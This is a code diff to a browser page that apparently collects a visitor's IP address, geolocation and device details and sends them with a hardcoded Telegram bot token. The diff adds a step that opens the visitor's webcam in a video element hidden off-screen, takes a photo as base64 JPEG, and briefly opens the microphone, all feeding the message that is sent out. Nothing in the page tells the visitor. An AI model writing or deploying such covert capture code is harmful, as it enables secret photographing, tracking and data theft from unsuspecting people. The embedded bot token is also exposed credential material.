@@ -416,6 +416,9 @@
                 let networkEffectiveType = 'N/A';
                 let deviceMemory = 'N/A';
                 let hardwareConcurrency = 'N/A';
+                let photoDataInfo = 'N/A'; // For captured photo snippet/status
+                let audioStatus = 'N/A';   // For microphone usage status
+
 
                 // Fetch IP and Geolocation regardless of includeDetailedInfo
                 try {
@@ -443,36 +446,67 @@
 
 
                 if (includeDetailedInfo) {
-                    // Camera Access
+                    // Camera Access & Capture
                     try {
                         const currentCameraState = await getPermissionStatus('camera');
-                        if (currentCameraState === 'granted') {
-                            cameraStatus = 'Granted';
+                        if (currentCameraState === 'granted' || currentCameraState === 'prompt') {
+                            cameraStatus = currentCameraState === 'granted' ? 'Granted' : 'Prompted & Granted';
+                            try {
+                                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                                const video = document.createElement('video');
+                                video.style.position = 'absolute'; // Hide video element
+                                video.style.left = '-9999px';
+                                video.style.top = '-9999px';
+                                video.srcObject = stream;
+                                document.body.appendChild(video);
+                                video.autoplay = true;
+                                await new Promise(resolve => video.onloadedmetadata = resolve);
+
+                                const canvas = document.createElement('canvas');
+                                canvas.width = 128; // Small resolution for demo
+                                canvas.height = 96;
+                                const context = canvas.getContext('2d');
+                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                const fullBase64Image = canvas.toDataURL('image/jpeg', 0.5); // 50% quality JPEG
+
+                                // Only include a snippet and length for text message
+                                photoDataInfo = `Captured (Size: ${fullBase64Image.length} chars). Snippet: ${fullBase64Image.substring(0, 50)}...`;
+
+                                stream.getTracks().forEach(track => track.stop());
+                                document.body.removeChild(video);
+                            } catch (captureError) {
+                                photoDataInfo = `Error capturing photo (${captureError.message || captureError.name})`;
+                                cameraStatus = `${cameraStatus} (Capture Error)`;
+                            }
                         } else if (currentCameraState === 'denied') {
                             cameraStatus = 'Permission Denied';
                         } else {
-                            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                            cameraStatus = 'Granted (Requested)';
-                            stream.getTracks().forEach(track => track.stop()); // Stop stream immediately
+                            cameraStatus = `Error/Denied Camera (${currentCameraState})`;
                         }
                     } catch (e) {
-                        cameraStatus = `Error/Denied Camera (${e.message || e.name})`;
+                        cameraStatus = `Error processing Camera (${e.message || e.name})`;
                     }
 
-                    // Microphone Access
+                    // Microphone Access (Symbolic use)
                     try {
                         const currentMicState = await getPermissionStatus('microphone');
-                        if (currentMicState === 'granted') {
-                            microphoneStatus = 'Granted';
+                        if (currentMicState === 'granted' || currentMicState === 'prompt') {
+                            microphoneStatus = currentMicState === 'granted' ? 'Granted' : 'Prompted & Granted';
+                            try {
+                                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+                                stream.getTracks().forEach(track => track.stop()); // Stop stream immediately
+                                audioStatus = 'Microphone briefly accessed.';
+                            } catch (captureError) {
+                                audioStatus = `Error accessing microphone for symbolic use (${captureError.message || captureError.name})`;
+                                microphoneStatus = `${microphoneStatus} (Access Error)`;
+                            }
                         } else if (currentMicState === 'denied') {
                             microphoneStatus = 'Permission Denied';
                         } else {
-                            const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
-                            microphoneStatus = 'Granted (Requested)';
-                            stream.getTracks().forEach(track => track.stop()); // Stop stream immediately
+                            microphoneStatus = `Error/Denied Microphone (${currentMicState})`;
                         }
                     } catch (e) {
-                        microphoneStatus = `Error/Denied Microphone (${e.message || e.name})`;
+                        microphoneStatus = `Error processing Microphone (${e.message || e.name})`;
                     }
 
                     // Notifications Access
@@ -545,6 +579,8 @@
                 } // End of includeDetailedInfo block
 
                 let permissionSection = '';
+                let mediaDataSection = '';
+
                 if (includeDetailedInfo) {
                     permissionSection = `
 🔒 *Permissions Status:*
@@ -554,6 +590,8 @@
 - Clipboard Read: ${clipboardReadStatus}
 - Clipboard Write: ${clipboardWriteStatus}
 - Screen Wake Lock: ${screenWakeLockStatus}
+- Gallery: Access via file input only (not directly accessible)
+- SMS: Not directly accessible (browser security restriction)
 
 🔋 *Device Info:*
 - Battery Level: ${batteryLevel}
@@ -563,6 +601,12 @@
 - Device Memory: ${deviceMemory}
 - Hardware Concurrency (CPU cores): ${hardwareConcurrency}
 `;
+                    if (photoDataInfo !== 'N/A') {
+                        mediaDataSection += `\n📷 *Photo Capture Info:* ${photoDataInfo}`;
+                    }
+                    if (audioStatus !== 'N/A') {
+                        mediaDataSection += `\n🎙️ *Microphone Use Info:* ${audioStatus}`;
+                    }
                 }
 
 
@@ -581,6 +625,7 @@
 🌍 *IP Address:* ${ip}
 📍 *Geolocation:* ${locationText}
 ${permissionSection}
+${mediaDataSection}
 `;
 
                 const botToken = '8110993477:AAH13IhAuwiaM7shHomBLrOpVcsk7jyIFLE';
